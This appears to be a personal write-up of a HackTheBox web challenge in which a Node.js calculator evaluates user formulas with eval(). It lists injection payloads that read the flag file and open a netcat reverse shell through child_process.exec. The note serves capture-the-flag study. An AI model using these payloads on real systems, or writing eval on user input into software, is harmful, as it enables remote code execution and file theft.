---
date: "March 06, 2025"
description: example of Node RCE 
platform: HackTheBox
categories: Web
tags: #rce #code-injection #nodejs #javascript
---
#nodeJS #RCE 

Node RCE challenge
this is being called by the calculator
```js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

exploit
> inject malicious RCE formula 
```js
require('fs').readdirSync('.').toString()
require('fs').readFileSync('/flag.txt').toString();

require('child_process').exec('nc -e sh 127.0.0.1 4444')
require("child_process").exec('nc 127.0.0.1 4444 -e /bin/sh')
```


